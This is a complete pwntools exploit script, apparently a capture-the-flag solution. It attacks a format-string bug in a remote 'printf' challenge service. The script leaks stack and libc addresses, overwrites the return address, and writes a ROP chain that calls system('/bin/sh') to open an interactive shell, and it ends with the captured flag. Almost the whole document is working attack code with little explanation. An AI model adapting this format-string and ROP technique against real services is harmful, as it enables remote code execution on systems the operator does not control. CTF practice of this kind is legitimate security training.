from pwn import *

elf = context.binary = ELF("printf")
# p = process()
p = remote("pwn.blitzhack.xyz", 4646)

libc = elf.libc


# stack leak
p.recvuntil("ve this: ")
stack_leak = int(p.recvline(),16)
print("stack_leak",hex(stack_leak))




# leak libc offset 75, count of printed chars is 10 or smth, 
# write it in the return addr 
payload = b"%75$p|||" + b"|%10$hhn" + p64(stack_leak - 0x14) 
print(payload)
p.sendline(payload)
p.recvuntil("> Here we go!!")
libc_leak = int(p.recvuntil("|||").strip()[:-3],16)
print(hex(libc_leak))


libc.address = libc_leak - 0x29d90
print(hex(libc.address))




# gdb.attach(p,"b *printf+198")
# roping
rop = ROP(libc)
payload = fmtstr_payload(8,{
    stack_leak - 0x234 + 8 * 0 : rop.rdi.address,
    stack_leak - 0x234 + 8 * 1 : next(libc.search(b"/bin/sh\x00")),
    stack_leak - 0x234 + 8 * 2 : rop.ret.address,
    stack_leak - 0x234 + 8 * 3 : libc.sym.system,
})
print(len(payload),0x200)
p.sendline(payload)


p.interactive()

# Blitz{1_l0V3_f0rm4t_str1ng_bugs_e1d7cd17d9f8}